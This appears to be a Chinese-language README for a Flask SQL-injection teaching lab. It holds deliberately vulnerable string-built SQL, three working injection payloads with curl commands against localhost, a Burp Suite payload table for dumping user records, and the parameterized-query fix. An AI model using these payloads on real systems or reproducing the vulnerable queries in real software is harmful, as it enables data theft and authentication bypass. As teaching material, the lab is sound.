# SQL注入漏洞分析与修复 — Flask用户管理系统

## 项目简介

基于 Flask + SQLite3 的用户管理系统，包含登录、用户搜索、用户注册功能。
本项目用于演示 Web 安全中 **SQL 注入漏洞** 的三种常见攻击方式，并给出完整的修复方案。

## 环境依赖

```bash
pip install flask
python vulnerable-app.py    # 启动漏洞版（端口 5000）
```

## 项目结构

```
sqli-lab/
├── vulnerable-app.py       # 漏洞版（f-string 拼接 SQL）
├── fixed-app.py            # 修复版（参数化查询）
├── data/users.db           # SQLite 数据库（自动生成）
├── templates/              # HTML 模板
│   ├── base.html
│   ├── login.html
│   ├── index.html
│   └── register.html
└── static/css/style.css    # 样式文件
```

---

## 漏洞原理

### 漏洞成因

搜索路由 `/search` 和注册路由 `/register` 直接使用 **f-string 拼接用户输入** 到 SQL 语句中，未做任何转义或参数化处理。

**漏洞代码（search 路由）：**
```python
sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
c.execute(sql)
```

**漏洞代码（register 路由）：**
```python
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
c.execute(sql)
```

当用户输入包含 SQL 特殊字符（如 `'`、`--`、`UNION`）时，攻击者可以改变原 SQL 语句的语义，执行非预期的数据库操作。

---

## 三个 POC 漏洞分析

### POC-1：UNION 注入获取自定义数据

**① 注入原理**

UNION 注入利用 `UNION SELECT` 关键字将自定义查询结果合并到原查询结果中。攻击者需要保证 UNION 两侧的列数一致，此处原 SELECT 返回 4 列（id, username, email, phone），因此 UNION SELECT 也需要提供 4 个值。

**② 拼接后的完整 SQL 语句**

用户输入 `keyword` 为：
```
' UNION SELECT 1,'inj','inj@x.com','138'--
```

代码拼接后实际执行的 SQL：
```sql
SELECT id, username, email, phone FROM users
WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
OR email LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
```

`'` 闭合原字符串，`UNION SELECT 1,'inj','inj@x.com','138'` 注入自定义数据，`--` 注释掉后续 SQL。

**③ 危害说明**

攻击者可构造任意返回数据，用于探测数据库结构、获取其他表数据。在实际攻击中可用于脱取敏感信息（如管理员密码哈希）。

---

### POC-2：OR 万能注入遍历全部用户

**① 注入原理**

OR 注入通过在 WHERE 条件中注入 `OR '1'='1'`，使条件恒为真，返回表中全部数据。

**② 拼接后的完整 SQL 语句**

用户输入 `keyword` 为：
```
' OR '1'='1
```

代码拼接后实际执行的 SQL：
```sql
SELECT id, username, email, phone FROM users
WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
```

`'` 闭合原字符串，`OR '1'='1` 使 WHERE 条件永真，`%'` 将前一个 LIKE 子句闭合。

**③ 危害说明**

攻击者无需知道具体用户名即可获取全部用户数据，破坏数据隔离。在登录场景中可用于绕过认证。

---

### POC-3：注册页面 SQL 注入

**① 注入原理**

注册接口将用户名直接拼接到 VALUES 子句中，攻击者通过闭合括号和 VALUES 列表，插入额外数据或修改插入逻辑。

**② 拼接后的完整 SQL 语句**

用户提交 `username` 为：
```
hacker', 'pass', 'h@x.com', '123')--
```

代码拼接后实际执行的 SQL：
```sql
INSERT INTO users (username, password, email, phone)
VALUES ('hacker', 'pass', 'h@x.com', '123')--', 'irrelevant', '', '')
```

`'` 闭合用户名字段，`')` 闭合 VALUES 列表，`--` 注释掉后续 `password`、`email`、`phone` 参数。

**③ 危害说明**

攻击者可以控制插入数据库的字段值，绕过服务端校验逻辑。结合其他注入可升级为更严重的攻击。

---

## POC 测试命令

启动漏洞版服务后，在另一终端中依次执行：

### POC-1：UNION 注入

```bash
# 1. 先登录获取 session cookie
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# 2. UNION 注入测试
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt | grep "inj"
```

**预期结果：** 页面响应包含 `inj` 字符串，表示 UNION 注入成功。

### POC-2：OR 万能注入

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt
```

**预期结果：** 页面返回 admin、alice 等全部用户数据。

### POC-3：注册注入

```bash
curl http://127.0.0.1:5000/register -d "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

**预期结果：** 页面提示"注册成功"，实际将 hacker/pass/h@x.com/123 插入数据库。

---

## Burp Suite 测试方法

1. 启动 Burp Suite，浏览器代理设置为 127.0.0.1:8080
2. 登录后访问 `http://127.0.0.1:5000/search?keyword=admin`
3. 在 Proxy → HTTP history 中找到该 GET 请求，右键 Send to Repeater
4. 在 Repeater 中修改 keyword 参数值，依次测试以下 Payload：

| 序号 | Payload | 说明 |
|------|---------|------|
| ① | `admin' OR '1'='1` | OR 万能注入，返回所有用户 |
| ② | `' UNION SELECT 1,2,3,4--` | UNION 探测列数，返回 1,2,3,4 |
| ③ | `' UNION SELECT 1,username,email,phone FROM users--` | UNION 获取真实用户数据 |

5. 点击 Send，观察 Response 中返回的数据是否异常。

---

## 修复方案

### 修复方法：参数化查询

使用 SQLite3 的 `?` 占位符替代 f-string 拼接，数据库驱动会自动处理特殊字符的转义。

**修复后的 search 路由：**
```python
@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")
    results = []
    if keyword:
        conn = sqlite3.connect("data/users.db")
        c = conn.cursor()
        # 使用 ? 占位符，参数由 execute 传入
        sql = "SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?"
        param = f"%{keyword}%"
        c.execute(sql, (param, param))
        for row in c.fetchall():
            results.append({"id": row[0], "username": row[1], "email": row[2], "phone": row[3]})
        conn.close()
    ...
```

**修复后的 register 路由：**
```python
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        email    = request.form.get("email", "")
        phone    = request.form.get("phone", "")
        conn = sqlite3.connect("data/users.db")
        c = conn.cursor()
        # 使用 ? 占位符，参数由 execute 传入
        sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
        c.execute(sql, (username, password, email, phone))
        conn.commit()
        conn.close()
        ...
```

### 修复前后对比

| 对比项 | 漏洞版（vulnerable-app.py） | 修复版（fixed-app.py） |
|--------|---------------------------|----------------------|
| SQL 构建方式 | f-string 直接拼接 | `?` 占位符参数化 |
| 用户输入影响 | 可改变 SQL 语义 | 仅作为参数值传递 |
| POC-1 UNION 注入 | ✅ 成功 | ❌ 失效 |
| POC-2 OR 万能注入 | ✅ 成功 | ❌ 失效 |
| POC-3 注册注入 | ✅ 成功 | ❌ 失效 |

---

## 运行方法

```bash
# 1. 启动漏洞版
cd /root/user-management-platform/sqli-lab
python vulnerable-app.py

# 2. 测试 POC（新开终端）
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt

# 3. 停止漏洞版，启动修复版
# Ctrl+C 停止，然后：
python fixed-app.py

# 4. 再次执行 POC，全部失效
```

---

## GitHub 上传步骤

### 1. 创建 GitHub 仓库

浏览器登录 https://github.com，点 `+` → New repository：
- Repository name: `flask-sqli-lab`
- Public
- 不要勾选任何初始化选项
- 点击 Create repository

### 2. 命令行上传

```bash
cd /root/user-management-platform/sqli-lab

# 初始化 Git 仓库
git init
git branch -m main

# 添加所有文件到暂存区
git add .

# 提交到本地仓库
git commit -m "feat: Flask SQL注入漏洞演示与修复代码"

# 关联远程仓库（替换为你的仓库地址）
git remote add origin https://github.com/你的用户名/flask-sqli-lab.git

# 推送到 GitHub
git push -u origin main
```

### 3. 首次推送认证

执行 `git push` 后，终端会提示输入 GitHub 用户名和密码。密码处填写 **Personal Access Token**（不是登录密码）。

Token 生成：GitHub → Settings → Developer settings → Personal access tokens → Generate new token → 勾选 `repo` → Generate → 复制 Token 备用。

### 4. 后续更新

```bash
git add .
git commit -m "fix: 更新内容说明"
git push
```

### 5. .gitignore 建议（可选）

创建 `.gitignore` 文件避免提交无用文件：
```
__pycache__/
*.pyc
data/
```
